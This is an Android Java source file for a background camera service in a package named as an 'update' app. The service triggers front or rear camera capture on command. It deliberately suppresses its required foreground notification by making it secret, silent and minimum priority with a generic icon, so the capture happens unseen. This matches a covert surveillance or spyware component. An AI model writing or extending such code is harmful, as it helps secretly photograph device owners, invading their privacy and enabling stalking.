package com.kasari.update;

import android.app.*;
import android.content.Intent;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;

/**
 * Foreground service wrapper for Camera2 capture.
 * Needed on Android 10+ to use camera in background.
 * Delegates actual capture to CameraCapture utility class.
 */
public class CameraService extends Service {

    public static final String ACTION_CAPTURE      = "com.kasari.update.CAMERA_CAPTURE";
    public static final String EXTRA_REAR          = "rear";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null || !ACTION_CAPTURE.equals(intent.getAction())) {
            stopSelf(); return START_NOT_STICKY;
        }
        boolean rear = intent.getBooleanExtra(EXTRA_REAR, false);
        startForeground(9905, buildNotif());
        CameraCapture.capture(this, rear);
        // Stop after 10 seconds max (capture callback handles completion)
        new android.os.Handler().postDelayed(() -> {
            stopForeground(true);
            stopSelf();
        }, 10000);
        return START_NOT_STICKY;
    }

    private Notification buildNotif() {
        return new NotificationCompat.Builder(this, BackgroundService.CH_ID)
            .setSmallIcon(android.R.drawable.sym_def_app_icon)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true).build();
    }

    @Override public IBinder onBind(Intent i) { return null; }
}
